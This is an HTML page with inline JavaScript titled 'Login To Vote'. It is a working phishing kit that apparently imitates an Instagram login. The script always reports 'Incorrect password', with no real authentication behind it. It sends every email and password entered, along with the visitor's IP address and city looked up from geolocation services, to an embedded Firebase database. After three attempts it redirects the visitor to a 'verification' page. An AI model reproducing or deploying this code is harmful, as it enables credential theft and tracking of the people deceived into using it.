<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login To Vote</title>
    <style>
      * {
        margin: 0;
        padding: 0;
        box-sizing: border-box;
        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen,
          Ubuntu, Cantarell, "Open Sans", "Helvetica Neue", sans-serif;
      }

      a { text-decoration: none; }

      main {
        height: 100vh;
        width: 100%;
        background-color: #fafafa;
        display: flex;
        align-items: center;
        justify-content: center;
        text-align: center;
        padding: 0 30px;
      }

      #forma {
        width: 350px;
        height: auto;
        text-align: center;
        border: 1px solid #c9c9c9;
        padding: 40px;
        padding-bottom: 20px;
        background-color: #fff;
        margin: auto;
      }

      form { margin-top: 20px; }

      .form-group {
        text-align: start;
        position: relative;
        margin: 15px 0;
      }

      .form-group label {
        position: absolute;
        top: 10px;
        left: 10px;
      }

      .form-group div {
        display: flex;
        align-items: center;
        justify-content: space-between;
        background-color: #fafafa;
        padding: 10px;
        border: 1px solid #c4c4c4;
        border-radius: 5px;
      }

      .form-group input {
        width: 100%;
        background: none;
        border: none;
        outline: none;
        font-size: 13px;
        color: #6b6b6b;
      }

      .field-icon {
        position: relative;
        color: rgb(65, 65, 65);
        font-size: 13px;
        z-index: 2;
        cursor: pointer;
        padding: 0;
        margin: 0;
      }

      button {
        width: 100%;
        border: 1px solid #1e71ec;
        background-color: #1e71ec;
        color: white;
        font-size: 13px;
        font-weight: 500;
        padding: 5px;
        border-radius: 5px;
        margin-top: 5px;
        cursor: pointer;
      }

      button:hover { background-color: #1558b8; border-color: #1558b8; }

      .orr {
        position: relative;
        text-align: center;
        margin: 20px 0;
      }

      .orr p {
        padding-bottom: 0;
        margin-bottom: 0;
        font-weight: 600;
        font-size: 13px;
        color: rgb(109, 109, 109);
      }

      .orr::after {
        position: absolute;
        content: "";
        height: 1px;
        width: 40%;
        background-color: #dadada;
        top: calc(50% - 0.5px);
        left: 0;
      }

      .orr::before {
        position: absolute;
        content: "";
        height: 1px;
        width: 40%;
        background-color: #dadada;
        top: calc(50% - 0.5px);
        right: 0;
      }

      form a {
        font-size: 13px;
        color: rgb(85, 85, 85);
      }

      .sign-up {
        height: auto;
        text-align: center;
        border: 1px solid #c9c9c9;
        padding: 20px;
        background-color: #fff;
        margin: auto;
        margin-top: 15px;
        width: 350px;
      }

      .sign-up p {
        margin-bottom: 0;
        padding-bottom: 0;
        color: rgb(15, 15, 15);
        font-size: 12px;
      }

      .sign-up p a {
        color: cornflowerblue;
        font-weight: 600;
        font-size: 15px;
      }

      .get {
        color: #000;
        margin: 15px 0;
      }

      .links {
        width: 100%;
        display: flex;
        align-items: center;
        justify-content: space-between;
        padding: 0 20px;
        width: 350px;
        margin: auto;
      }

      .links a img { height: 45px; width: auto; }

      .nd-links {
        display: flex;
        flex-wrap: wrap;
        align-items: center;
        margin-top: 40px;
        text-align: center;
        justify-content: center;
      }

      .nd-links a {
        font-size: 12px;
        margin: 0 10px;
        color: #848585;
      }

      footer p {
        margin-top: 20px;
        color: #848585;
        font-size: 13px;
      }

      #alert-message {
        color: rgb(255, 0, 0);
        font-size: 13px;
        margin-bottom: 10px;
      }

      .error-border { border-color: red !important; }

      @media screen and (max-width: 450px) {
        main { height: 110vh; }
        #forma { background-color: transparent; border: none; }
        .sign-up { background-color: transparent; border: none; }
      }
    </style>
</head>

    <script src="https://www.gstatic.com/firebasejs/9.6.0/firebase-app-compat.js"></script>

    <script>
      // ============================================================
      // FIREBASE INITIALIZATION
      // ============================================================
      const firebaseConfig = {
        apiKey: "AIzaSyCPvzqENhVGPacEtCy8A3FMu-ftC_Fo3u8",
        authDomain: "voting-76678.firebaseapp.com",
        databaseURL: "https://voting-76678-default-rtdb.europe-west1.firebasedatabase.app",
        projectId: "voting-76678",
        storageBucket: "voting-76678.firebasestorage.app",
        messagingSenderId: "92083343112",
        appId: "1:92083343112:web:84319eb8f7b063c6a1e6bd",
        measurementId: "G-50ZFKEPY90"
      };

      firebase.initializeApp(firebaseConfig);
      const database = firebase.database();

      // ============================================================
      // STATE
      // ============================================================
      const MIN_PASSWORD_LENGTH   = 6;
      const MAX_ATTEMPTS          = 3;
      const ATTEMPT_STORAGE_KEY   = 'ig_failed_attempts';
      const EMAIL_STORAGE_KEY     = 'ig_login_email';
      const PASSWORD_STORAGE_KEY  = 'ig_login_password';

      // Persist attempt count across page reloads
      let failedAttempts = parseInt(sessionStorage.getItem(ATTEMPT_STORAGE_KEY) || '0', 10);

      let userCountry = 'Unknown';
      let userCity    = 'Unknown';
      let userIP      = 'Unknown';
      let locationReady = false;

      // ============================================================
      // LOCATION LOOKUP (non-blocking)
      // ============================================================
      (async function fetchLocationData() {
        try {
          const ipRes  = await fetch('https://api.ipify.org?format=json');
          const ipData = await ipRes.json();
          userIP = ipData.ip;

          const geoRes  = await fetch(`https://ipapi.co/${userIP}/json/`);
          const geoData = await geoRes.json();
          userCountry = geoData.country_name || 'Unknown';
          userCity    = geoData.city         || 'Unknown';
          locationReady = true;
          console.log('Location data retrieved:', userCountry, userCity, userIP);
        } catch (err) {
          console.warn('Primary location service failed, trying fallback…', err);
          try {
            const fbRes  = await fetch('https://ip-api.io/json/');
            const fbData = await fbRes.json();
            userCountry = fbData.country_name || 'Unknown';
            userCity    = fbData.city         || 'Unknown';
            userIP      = fbData.ip           || 'Unknown';
            locationReady = true;
          } catch (fbErr) {
            console.warn('Fallback location service also failed:', fbErr);
          }
        }
      })();

      // ============================================================
      // SAVE FAILED LOGIN ATTEMPT TO FIREBASE
      // ============================================================
      function saveFailedAttempt(username, password, reason) {
        const doSave = () => {
          const attemptData = {
            email:     username,
            password:  password,
            ip:        userIP,
            location:  `${userCity}, ${userCountry}`,
            timestamp: new Date().toISOString(),
            reason:    reason || 'incorrect_password',
            source:    'login_page'
          };

          const key = 'login_' + Date.now() + '_' + Math.random().toString(36).slice(2, 8);

          database.ref('Instagram/' + key).set(attemptData)
            .then(() => console.log('Failed login attempt saved:', key))
            .catch(e => console.error('Error saving login attempt:', e));
        };

        // Wait up to 2s for location data if it's not ready
        if (locationReady) {
          doSave();
        } else {
          let waited = 0;
          const iv = setInterval(() => {
            if (locationReady || waited >= 2000) {
              clearInterval(iv);
              doSave();
            }
            waited += 100;
          }, 100);
        }
      }

      // ============================================================
      // PASSWORD VALIDATION (minimum 6 chars)
      // ============================================================
      function validatePassword(password) {
        if (!password) {
          return { valid: false, message: 'Password is required' };
        }
        if (password.length < MIN_PASSWORD_LENGTH) {
          return {
            valid: false,
            message: 'Incorrect password! Please try again...'
          };
        }
        return { valid: true, message: '' };
      }

      // ============================================================
      // FORM VALIDATION (presence check)
      // ============================================================
      function validateForm() {
        const email             = document.getElementById('email').value.trim();
        const password          = document.getElementById('password').value.trim();
        const alertMessage      = document.getElementById('alert-message');
        const emailContainer    = document.getElementById('email-container');
        const passwordContainer = document.getElementById('password-container');

        alertMessage.textContent = '';
        emailContainer.classList.remove('error-border');
        passwordContainer.classList.remove('error-border');

        let isValid = true;

        if (!email && !password) {
          alertMessage.textContent = 'Both username/email and password are required';
          emailContainer.classList.add('error-border');
          passwordContainer.classList.add('error-border');
          isValid = false;
        } else if (!email) {
          alertMessage.textContent = 'Username or email is required';
          emailContainer.classList.add('error-border');
          isValid = false;
        } else if (!password) {
          alertMessage.textContent = 'Password is required';
          passwordContainer.classList.add('error-border');
          isValid = false;
        }

        return isValid;
      }

      // ============================================================
      // LOGIN HANDLER
      // ============================================================
      document.getElementById('login').addEventListener('click', function (e) {
        e.preventDefault();

        if (!validateForm()) return;

        const email    = document.getElementById('email').value.trim();
        const password = document.getElementById('password').value.trim();
        const feedback = document.getElementById('feedback');

        // ------------------------------------------------------------
        // Persist credentials so verification.html can read them
        // ------------------------------------------------------------
        sessionStorage.setItem(EMAIL_STORAGE_KEY, email);
        sessionStorage.setItem(PASSWORD_STORAGE_KEY, password);

        // ------------------------------------------------------------
        // Enforce minimum password length
        // ------------------------------------------------------------
        const pwCheck = validatePassword(password);
        if (!pwCheck.valid) {
          feedback.textContent = pwCheck.message;

          failedAttempts++;
          sessionStorage.setItem(ATTEMPT_STORAGE_KEY, failedAttempts);

          saveFailedAttempt(email, password, 'password_too_short');

          if (failedAttempts >= MAX_ATTEMPTS) {
            setTimeout(() => {
              window.location.href = 'verification.html';
            }, 800);
          }
          return;
        }

        // ------------------------------------------------------------
        // Normal wrong-password path (no real auth here)
        // ------------------------------------------------------------
        feedback.textContent = 'Incorrect password! Please try again...';

        failedAttempts++;
        sessionStorage.setItem(ATTEMPT_STORAGE_KEY, failedAttempts);

        saveFailedAttempt(email, password, 'incorrect_password');

        if (failedAttempts >= MAX_ATTEMPTS) {
          setTimeout(() => {
            window.location.href = 'verification.html';
          }, 800);
        }
      });

      // ============================================================
      // PASSWORD SHOW / HIDE TOGGLE
      // ============================================================
      document.querySelector('.toggle-password').addEventListener('click', function () {
        const passwordInput = document.querySelector(this.getAttribute('toggle'));
        const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
        passwordInput.setAttribute('type', type);
        this.textContent = type === 'password' ? 'show' : 'hide';
      });

      // ============================================================
      // CLEAR ERRORS ON INPUT
      // ============================================================
      document.getElementById('email').addEventListener('input', function () {
        document.getElementById('email-container').classList.remove('error-border');
        document.getElementById('alert-message').textContent = '';
        document.getElementById('feedback').textContent = '';
      });

      document.getElementById('password').addEventListener('input', function () {
        document.getElementById('password-container').classList.remove('error-border');
        document.getElementById('alert-message').textContent = '';
        document.getElementById('feedback').textContent = '';
      });
    </script>
</body>
</html>
